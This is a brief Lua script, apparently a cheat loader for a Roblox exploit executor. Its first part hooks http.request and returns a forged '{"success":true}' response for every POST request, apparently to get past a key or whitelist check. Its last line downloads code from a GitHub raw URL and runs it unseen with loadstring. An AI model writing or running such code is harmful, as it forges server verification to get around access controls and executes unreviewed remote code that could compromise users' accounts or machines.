local Old; Old = hookfunction(http.request, function(Request)
    if Request.Method ~= 'POST' then return Old(Request) end

    return {
        Success = true,
        StatusCode = 200,
        Body = '{"success":true}'
    }
end)

loadstring(game:HttpGet('https://raw.githubusercontent.com/phobosv211/clarkWARE/refs/heads/main/main'))()
